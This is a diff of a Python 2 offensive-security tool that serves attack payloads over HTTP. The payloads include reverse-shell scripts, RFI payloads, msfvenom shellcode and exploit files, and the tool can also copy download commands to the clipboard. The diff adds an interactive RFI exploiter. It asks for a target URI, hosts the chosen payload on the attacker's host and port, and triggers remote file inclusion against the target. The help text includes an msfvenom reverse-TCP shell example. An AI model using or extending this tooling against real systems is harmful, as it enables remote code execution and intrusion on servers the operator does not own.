@@ -4,14 +4,14 @@ import SimpleHTTPServer
 import SocketServer
 import os
 import sys
-from thread import *
-import sys
+import threading
 import glob
 import argparse
 import shutil
 from argparse import RawTextHelpFormatter
 import subprocess
 from simplelistener import SimpleListener
+from rfix import RfiExploiter
 
 VERSION_MAJOR="0"
 VERSION_MINOR="2b"
@@ -30,14 +30,16 @@ LPORT_PLACEHOLDER="LPORT"
 YOLO_PAYLOAD="sh"
 YOLO_PAYLOAD_LIST=["sh", "py", "ps1"]
 
-RFI_TYPE="php"
-RFI_TYPES=["php", "asp", "aspx"]
-
 EXPLOITS_DEFAULT="suggesters"
 EXPLOITS_TARGETS=["suggesters", "linux", "windows", "mac"]
 
 CLIPBOARD_OPTION="wget"
 CLIPBOARD_OPTIONS=["wget", "curl", "powershell"]
+
+class QuietHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+	def log_message(self, format, *args):
+		pass
+
 
 def vprint(s, level=1):
 	if level <= args.verbosity:
@@ -63,16 +65,16 @@ def parse_args():
 
 	group = parser.add_mutually_exclusive_group(required=True)
 
-	group.add_argument("-y", "--yolo", nargs="?", choices=YOLO_PAYLOAD_LIST, const=YOLO_PAYLOAD, help="YOLO mode. Copy custom payloads from the corresponding '{0}' directory to root directory. Use it to serve one request and shutdown. Useful when chained with a reverse shell listener, listening on the same port. Warning: With this option on, -p/--port value will always be used even if LPORT is set. E.g.: {1} -p 53 -y".format(YOLO_DIR, sys.argv[0]))
-	group.add_argument("-r", "--rfi", nargs="?", choices=RFI_TYPES, const=RFI_TYPE, help="RFI mode. Copy custom RFI payload from corresponding '{0}' directory to root directory. Default: {1}. Use with -e/--extension argument to remove or change file extension.".format(RFI_DIR, RFI_TYPE))
-	group.add_argument("-x", "--exploits", nargs="?", choices=EXPLOITS_TARGETS, const=EXPLOITS_DEFAULT, help="Exploits mode. Copy custom exploits from the corresponding '{0}' directory to root directory. The default value is: linux.".format(EXPLOITS_DIR))
+	group.add_argument("-y", "--yolo", nargs="?", choices=YOLO_PAYLOAD_LIST, const=YOLO_PAYLOAD, help="YOLO mode. Copies custom payloads from the corresponding '{0}' directory to root directory. Use it to serve one request and shutdown. Useful when chained with a reverse shell listener, listening on the same port. Warning: With this option on, -p/--port value will always be used even if LPORT is set. E.g.: {1} -p 53 -y".format(YOLO_DIR, sys.argv[0]))
+	group.add_argument("-r", "--rfi", action="store_true", help="RFI mode. Copies custom RFI payload from corresponding '{0}' directory to root directory and launches an Rfi Exploiter instance.".format(RFI_DIR))
+	group.add_argument("-x", "--exploits", nargs="?", choices=EXPLOITS_TARGETS, const=EXPLOITS_DEFAULT, help="Exploits mode. Copies custom exploits from the corresponding '{0}' directory to root directory. The default value is: linux.".format(EXPLOITS_DIR))
 	group.add_argument("-m", "--msf-shell", nargs="?", help="msfvenom mode. Use msfvenom to create a shellcode and serve it. Use it just like msfvenom without LHOST, LPORT and -o parameters. E.g.: {0} -m \" -p linux/x86/shell_reverse_tcp -f elf\" --LHOST 192.168.0.1 --LPORT 53. (msfvenom required)".format(sys.argv[0]))
-	group.add_argument("-f", "--files", nargs="+", help="Custom files mode. Simply copy desired files to root directory.")
+	group.add_argument("-f", "--files", nargs="+", help="Custom files mode. Simply copies desired files to root directory.")
 
 	parser.add_argument("-e", "--extension", nargs="?", const='', help="Change files extension. Only useful when used with -r/--rfi.")
-	parser.add_argument("-c", "--clipboard", nargs="?", choices=CLIPBOARD_OPTIONS, const=CLIPBOARD_OPTION, help="Copy wget/curl/powershell + URL string to clipboard. Default: wget. (xclip required)")
+	parser.add_argument("-c", "--clipboard", nargs="?", choices=CLIPBOARD_OPTIONS, const=CLIPBOARD_OPTION, help="Copies wget/curl/powershell + URL string to clipboard. Default: wget. (xclip required)")
 
-	parser.add_argument("-v", "--verbosity", type=int, choices=[0,1,2], default=1, help="Set verbosity level.")
+	parser.add_argument("-v", "--verbosity", type=int, choices=[0,1,2], default=1, help="Sets verbosity level.")
 
 	parser.add_argument("--LHOST", default="127.0.0.1", help="Use to substitute host placeholder.")
 	parser.add_argument("--LPORT", type=int, help="Use to substitute port placeholder.")
@@ -121,7 +123,7 @@ def main():
 	                       	continue
 
 	elif args.rfi:
-	       	for filename in glob.glob(os.path.join(RFI_DIR, args.rfi + '*')):
+	       	for filename in glob.glob(os.path.join(RFI_DIR, '*')):
 			filename_root = os.path.splitext(filename)[0]
 			if args.extension == None:
 				new_filename = filename
@@ -195,7 +197,53 @@ def main():
 			vprint(filename)
 		vprint("")
 
-		if args.yolo:
+		if args.rfi:
+			while True:
+				input = None
+				while input not in ("y", "n", ""):
+					input = raw_input("Do you want to launch RFI Exploiter? [y] ")
+				if input == "y" or input == "":
+					vprint("Now on RFIX mode", 2)
+					if len(file_list) == 0:
+						print("No payload available.")
+						break
+					elif len(file_list) == 1:
+						input = 0
+						print("Using {0} as payload.".format(list(file_list)[input]))
+					else:
+						i = 0
+						for filename in file_list:
+							print "\t[{0}]\t{1}".format(i, filename)
+							i = i + 1
+						while input not in range(i):
+							try:
+								input = int(raw_input("Which payload would you like to use? [0] "))
+							except ValueError:
+								if input == "":
+									input = 0
+									break
+								pass
+					rfi_file = list(file_list)[input]
+					input = raw_input("What's the target's URI? ")
+					rfix = RfiExploiter(input, rfi_file, "http://{0}:{1}/{2}".format(args.LHOST, args.LPORT, rfi_file))
+					handler = QuietHandler
+					httpd = SocketServer.TCPServer((args.binding_address, args.port), handler)
+					httpd_thread = threading.Thread(target=httpd.serve_forever)
+					httpd_thread.start()
+
+					rfix.run()
+
+					httpd.shutdown()
+					httpd.server_close()
+
+				elif input == "n":
+					vprint("Now on HTTPD mode", 2)
+					handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+					httpd = SocketServer.TCPServer((args.binding_address, args.port), handler)
+					httpd.serve_forever()
+					break
+
+		elif args.yolo:
 			while True:
 				vprint("Now on HTTPD mode", 2)
 				httpd = SocketServer.TCPServer((args.binding_address, args.port), handler)
